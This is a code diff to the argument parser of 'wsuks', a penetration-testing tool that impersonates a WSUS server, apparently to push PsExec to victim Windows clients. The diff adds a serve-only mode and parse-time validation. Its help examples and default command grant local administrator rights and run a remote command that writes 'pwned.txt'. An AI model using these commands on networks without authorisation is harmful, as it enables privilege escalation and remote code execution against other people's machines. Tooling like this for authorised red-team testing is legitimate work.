@@ -28,14 +28,17 @@ def initParser():
     wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2                                   # Generates a new user&password and adds it to the local admin group
     wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -d Domain.local           # Adds the domain user to the local admin group
     wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1   # Turns on WSUS server discovery and adds the domain user to the local admin group
+    wsuks --serve-only                                                                # Just run the WSUS server without ARP spoofing (supports -e, -c, --tls-cert, etc.)
+    wsuks --serve-only -c '/accepteula /s cmd.exe /c "whoami > C:\pwned.txt"'         # Serve PSExec64.exe with custom command
     """
     parser = argparse.ArgumentParser(prog="wsuks", epilog=example_text, formatter_class=RawTextHelpFormatter)
 
     parser.add_argument("-v", "--version", action="version", version="Current Version: %(prog)s 2.0")
     parser.add_argument("--debug", action="store_true", help="Enable debug output")
     parser.add_argument("-ts", "--timestamp", action="store_true", help="Add timestamp to log messages")
+    parser.add_argument("--serve-only", action="store_true", help="Only run the WSUS server without MITM/ARP spoofing")
 
-    parser.add_argument("-t", "--target-ip", metavar="", dest="targetIp", help="IP Address of the victim Client. (REQUIRED)", required="--only-discover" not in parser.parse_known_args()[1])
+    parser.add_argument("-t", "--target-ip", metavar="", dest="targetIp", help="IP Address of the victim Client. (REQUIRED unless using --serve-only)")
     parser.add_argument("-I", "--interface", metavar="", help="Network Interface to use. (DEFAULT: %(default)s)", default="eth0")
     parser.add_argument("-e", "--executable", metavar="", default=f"{dirname(wsuks.__file__)}/executables/PsExec64.exe", type=argparse.FileType("rb"), help="The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)")
     parser.add_argument("-c", "--command", metavar="", default='/accepteula /s powershell.exe "{CREATE_USER_COMMAND}Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member {WSUKS_USER};"', help="The command to execute on the victim. \n(DEFAULT (details see README): %(default)s)",)
@@ -46,7 +49,7 @@ def initParser():
     simple.add_argument("--dc-ip", metavar="", dest="dcIp", help="IP Address of the domain controller")
     simple.add_argument("-d", "--domain", metavar="", help="Domain to authenticate with")
     simple.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication instead of NTLM")
-    simple.add_argument("--dc-name", metavar="", dest="dcName", help="Domain Controller Name to authenticate with, required for Kerberos authentication", required=parser.parse_known_args()[0].kerberos)
+    simple.add_argument("--dc-name", metavar="", dest="dcName", help="Domain Controller Name to authenticate with, required for Kerberos authentication")
     simple.add_argument("--only-discover", action="store_true", help="Only discover the WSUS Server and exit")
 
     advanced = parser.add_argument_group("MANUAL MODE", "If you know the WSUS Server, you can use this mode to skip the automatic discovery.")
@@ -54,4 +57,13 @@ def initParser():
     advanced.add_argument("--WSUS-Port", metavar="", dest="wsusPort", type=int, help="Port of the WSUS Server. (DEFAULT: 8530 for HTTP, 8531 for HTTPS)")
     advanced.add_argument("--tls-cert", metavar="", dest="tlsCert", help="Path to a TLS certificate that is valid for the WSUS Server. Turns on HTTPS mode.")
 
-    return parser.parse_args()
+    args = parser.parse_args()
+    
+    # Validate conditional requirements
+    if not args.serve_only and not args.only_discover and not args.targetIp:
+        parser.error("argument -t/--target-ip is required unless using --serve-only or --only-discover")
+    
+    if args.kerberos and not args.dcName:
+        parser.error("argument --dc-name is required when using --kerberos")
+    
+    return args
